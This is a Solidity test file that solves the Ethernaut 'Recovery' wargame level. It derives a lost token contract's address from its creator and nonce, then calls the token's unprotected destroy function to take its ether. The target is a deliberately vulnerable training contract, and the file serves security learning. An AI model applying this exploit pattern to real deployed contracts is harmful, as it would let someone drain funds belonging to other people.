// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {RecoveryFactory} from "../src/factories/RecoveryFactory.sol";
import {Recovery, SimpleToken} from "../src/levels/Recovery.sol";

contract RecoveryTest is EthernautTest {
    function setUpLevel() public override {
        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
    }

    function testSolveRecovery() public {
        Recovery recoveryInstance = Recovery(payable(levelAddress));
        address lostAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), recoveryInstance, uint8(0x01)))))
        );
        SimpleToken token = SimpleToken(payable(lostAddress));
        token.destroy(payable(msg.sender));
        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
